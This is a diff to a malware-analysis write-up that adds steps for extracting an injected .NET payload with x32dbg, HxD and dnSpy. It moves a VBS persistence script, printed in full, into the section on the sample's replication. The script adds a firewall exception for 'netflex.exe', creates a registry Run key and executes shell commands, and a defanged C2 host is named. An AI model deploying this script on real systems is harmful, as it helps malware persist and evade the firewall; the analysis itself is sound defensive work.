@@ -88,40 +88,36 @@ Most interestingly, we can see a NtWrite API call occurring, however, it only se
 
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/db05a2ba-1cb1-4cbc-821e-be7dbfa3e387)
 
+We'll set a breakpoint in x32dbg with "bp NtWriteFile" and run until that breakpoint is met.
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/703b708b-975a-476c-8d35-e203f022ddcf)
+
+We can see in the stack that there is an address with "MZ" text which is likely our executable, so we'll follow this in dump.
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/7f3a3a6e-c861-4025-a930-276a3beb477e)
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/6738a72d-f15c-4cf1-81ef-0d653d8be98f)
+
+There are very strong indications that this is a binary file being written, we'll follow this in memory map and dump the memory in a file in an attempt to extract the binary.
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/0433f1a5-718c-47c4-8673-531b4bc67e02)
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/f39d3fb0-becb-4b17-adbc-35bc1ed4856c)
+
+As this was extracted from memory, we need to clean some bits up before we get our executable, we can do this with HxD and delete everything before our MZ header.
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/3595c7dc-21f8-4909-9b56-f90d86b74120)
+
+This is a .NET binary so we will run it through DNSpy to figure out what it's doing.
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/28ef07f4-5a8a-421d-8b18-d8acbca8338c)
 
 
 
 
-Once this code is injected and executed, it drops a PE in the location 'C:\Users\user\AppData\Roaming\netflex\netflex.exe', as well as employing some persistence mechanisms, such as a vbs script in the startup folder and a registry run key.
 
-**VBS Script**
-```
-dim shellobj
-set shellobj = wscript.createobject("http://wscript.shell")
 
-ddd= "netsh firewall add allowedprogram c:\users\user\appdata\roaming\netflex\netflex.exe ""netflex.exe"" ENABLE"
-cmdshell(ddd)
 
-shellobj.regwrite "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & split ("netflex.exe",".")(0), "c:\users\user\appdata\roaming\netflex\netflex.exe", "REG_SZ"
-
-function cmdshell (cmd)
-
-dim httpobj,oexec,readallfromany
-
-set oexec = shellobj.exec ("%comspec% /C /Q /K /S" & cmd)
-if not oexec.stdout.atendofstream then
-   readallfromany = oexec.stdout.readall
-elseif not oexec.stderr.atendofstream then
-   readallfromany = oexec.stderr.readall
-else 
-   readallfromany = ""
-end if
-
-cmdshell = readallfromany
-end function
-```
-
-Added to the Startup directory, the vbs script adds the 'netflex' binary as an exception against Windows Firewall and creates a registry run key as a persistence mechanism.
 
 ## 1st Executable 
 
@@ -186,13 +182,40 @@ C2: netflex.duckdns[.]org:2255
 
 **Replication**
 
-There is also the capability for replication across removable media drives, creating the same vbs script which was mentioned before.
+There is also the capability for replication across removable media drives, and creating a vbs script as a means of persistence.
 
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/381c8cc6-fca3-42da-ad73-5d1b4f3e790f)
 
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/8eb4112f-fa44-46a2-924a-711cf073aca0)
 
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/b47f825d-f9e8-4a07-b3be-14859f79be54)
+
+**VBS Script**
+```
+dim shellobj
+set shellobj = wscript.createobject("http://wscript.shell")
+
+ddd= "netsh firewall add allowedprogram c:\users\user\appdata\roaming\netflex\netflex.exe ""netflex.exe"" ENABLE"
+cmdshell(ddd)
+
+shellobj.regwrite "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\run\" & split ("netflex.exe",".")(0), "c:\users\user\appdata\roaming\netflex\netflex.exe", "REG_SZ"
+
+function cmdshell (cmd)
+
+dim httpobj,oexec,readallfromany
+
+set oexec = shellobj.exec ("%comspec% /C /Q /K /S" & cmd)
+if not oexec.stdout.atendofstream then
+   readallfromany = oexec.stdout.readall
+elseif not oexec.stderr.atendofstream then
+   readallfromany = oexec.stderr.readall
+else 
+   readallfromany = ""
+end if
+
+cmdshell = readallfromany
+end function
+```
 
 **Persistence**
 
